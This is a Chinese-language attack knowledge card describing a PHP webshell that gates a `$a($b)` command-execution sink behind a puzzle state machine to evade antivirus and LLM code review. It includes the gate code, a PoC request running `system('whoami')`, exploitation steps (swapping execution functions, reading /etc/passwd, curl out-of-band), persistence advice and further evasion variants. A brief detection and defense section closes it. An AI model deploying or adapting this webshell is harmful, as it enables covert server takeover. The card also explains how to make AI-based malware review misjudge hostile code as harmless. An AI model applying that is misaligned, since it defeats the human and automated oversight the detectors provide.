---
id: web-php-rce-webshell-puzzle-state-gate-av-bypass
title: 解谜状态机门控 WebShell：RCE 藏在「方块全等」判定之后，静态与沙箱只看到游戏逻辑
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-puzzle-state-machine-gate
aliases:
- 分支对抗 WebShell
- 逻辑门控免杀
- 原神方块阵 WebShell
- InazumaPuzzle WebShell
- 状态机前置条件 webshell
tags:
- php
- webshell
- av-bypass
- obfuscation
- logic-gate
- state-machine
- dynamic-call
- ai-detection
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:58:27+08:00'
  notes: 已对照原文核对：入口 foreach(\ as \=>\) \$\=\、\ 拆字符、InazumaPuzzle 四块 0..2 轮转、setBackBlock/hit 语义、getLockerStatus 四块全等判定、末尾 if(getLockerStatus()) \(\) 均与原文代码一致；ABBCCD 六步推演逐行与原文一致（末态 2,2,2,2），实测 payload wpstring=ABBCCD&a=system&b=whoami 与原文一致。未验证点：原文只给出 HackBar 请求与各引擎扫描截图（d99net 0 可疑、微步 0/28），回显区为乱码，'回显主机与用户名'为按截图推断，未做独立复现；未执行任何 PHP 代码。
---

## 一句话结论

把 `$a($b)` 这类命令执行 sink 放在一个自洽的「解谜状态机」之后：脚本先跑一段四方块轮转逻辑（A/B/C/D 各自 0→2 循环，点一下抬升相邻方块、满 2 则归零），只有提交的唯一正解（原文 `ABBCCD`）使四个方块状态全等、`getLockerStatus()` 返回 true 时才执行动态调用——静态扫描和 LLM 判读看到的都是「一个解谜游戏实现」，危险调用被置于条件分支内部，因而被判为无害。

## 原理

- **门控结构**：脚本入口 `foreach($_POST as $k=>$v) $$k=$v;` 把 POST 参数批量注册成同名变量；随后把 `$wpstring` 逐字符拆进 `$puzz_writeup` 数组，`InazumaPuzzle::__AFG50CE4_RG1()` 校验每个字符只能是 A/B/C/D，再逐个 `hit()` 推进状态。
- **状态机自洽**：`setBackBlock($x)` 是「若该方块已到 2 则归零并返回 true，否则返回 false」，`hit()` 对每个受影响的方块 `if (!setBackBlock(x)) blockX += 1`，即「满了就回零、没满就加一」的二态轮转。四个方块初值 `A=2,B=0,C=0,D=2`，`ABBCCD` 恰好把它们全部推到 2，`blockA===blockB===blockC===blockD` 成立。
- **sink 位置**：文件末尾 `if ($appor5nnb->getLockerStatus()) $a($b);`。`$a` 与 `$b` 都由 `$$key` 变量变量从 POST 注入（原文 `a=system&b=whoami`），因此"函数调用"看起来是解谜成功后的收尾动作，而不是明显的后门结构。
- **为什么能骗过检测**：一是危险符号 `system`、`eval`、`assert` 与 `$_POST['x']` 都不以明文字面量出现（`$a($b)` 只是变量调用）；二是 sink 被放在一个需要"解谜状态"才能到达的分支里，基于"不可达/无外部可控输入"判断的静态规则会认为前置条件不可满足；三是整段代码的业务语义（谜题、报错文案、方块命名）自成一体，LLM 判读时倾向把它解释为"游戏逻辑"——原文的 AI 解读结论就是"并非恶意、不涉及网络攻击或数据泄露"。
- **可执行性关键**：门控不是死代码——攻击者提交正解即可让条件为真，相当于把可达路径藏进了正常业务路径里。原文实测 POST `wpstring=ABBCCD&a=system&b=whoami` 回显了 `whoami` 输出的主机与用户名，说明执行链已完整打通。

## 触发条件

- 目标 PHP 允许 `system`/`exec`/`shell_exec` 等函数（或换成可用的回调函数）；
- 文件已落在可被 Web 访问的路径（上传、写入、包含等前置环节独立）；
- 防护以静态特征/结构判定或 LLM 代码判读为主；若存在强运行时行为监控，仍需额外规避；
- 攻击者知道正解序列（同款马的正解固定，可离线枚举或直接照抄）。

## 利用步骤

1. 落地文件后先确认页面可访问（无参数时返回谜题提示语，说明脚本已执行）。
2. 提交正解与函数/命令参数：`wpstring=ABBCCD&a=system&b=id`；`$$key` 会自动把 `a`、`b` 注册为变量，`$a($b)` 即 `system('id')`。
3. 若非 `system` 可用，换 `a=shell_exec`、`a=passthru`、`a=exec` 等；命令需要多参数时把 `b` 换成分隔好的整串（如 `b=cat /etc/passwd`）。
4. 回显缺失时改用写文件/带外：`a=file_put_contents` 需要两个参数，可改为 `a=assert`+`b=...` 或直接换成 `a=system&b=curl ...`（目标需出网）。
5. 需要长期驻留时保留原文件，凭正解随时复用；被发现后则按同结构换一套谜题常量（正解随之改变）。

## PoC

```http
POST /shell/1.php HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

wpstring=ABBCCD&a=system&b=whoami
```

核心门控片段（结构示意，非整文件）：

```php
foreach($_POST as $key => $value) $$key = $value;
$puzz_writeup = str_split($wpstring);
// ... InazumaPuzzle：四个方块 0..2 轮转，按 A/B/C/D 推动相邻方块 ...
$appor5nnb = new InazumaPuzzle();
$appor5nnb->__AFG50CE4_RG1();          // 校验字符集并推进状态
if ($appor5nnb->getLockerStatus()) $a($b);   // 四块全等才执行
```

状态推演（原文）：`A`→(A0,B1,C0,D2)，`B`→(1,2,1,2)，`B`→(2,0,2,2)，`C`→(2,1,0,0)，`C`→(2,2,1,1)，`D`→(2,2,2,2)。

## 变体与关联

- 变体：把"全等判定"换成别的可自证条件（校验和、魔方阵、数独行/列约束、哈希前缀匹配），只要"输入正确才为真、错误则走无害分支"即可，正解可离线求解后硬编码。
- 变体：sink 用可变变量 + 变量函数（`$$key` + `$a($b)`）之外，也可用 `call_user_func`、`array_map`、闭包；门控外壳保持不变。
- 变体：在门控外壳内再叠加密/编码层（如 `urldecode`、`strrev` 反复处理中间变量），进一步稀释特征。
- 关联：[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（同属"隐藏函数名"路线，但那张靠按位取反隐藏字面量，本卡靠不可达分支隐藏 sink 位置）。
- 关联：[[ai-security-prompt-injection-ai-webshell-detector-structural-blindspots]]（AI 判读的结构盲区；本卡的门控外壳正是"业务语义自洽"这一类的实例）。
- 边界：门控只影响"检测方对可达性的判断"，不影响运行时；一旦攻击者提交正解，EDR 仍能看到 `system` 派生子进程。

## 检测与防御

- 检测：搜 `$$key` 形式的批量变量注册 + 文件尾部 `$var($var)` 动态调用组合；对含"谜题/游戏"语义但内部大量 `switch`+自增状态推进的 PHP 文件提高审查优先级；在运行时按进程树看 PHP 子进程（`sh -c`、`whoami`、`id` 等短命令）。
- 防御：禁用危险函数（`disable_functions`）、限制 Web 目录可写、对上传目录做内容与扩展名双重校验；部署 RASP/EDR 关注 `system` 一类调用而非仅文件特征。
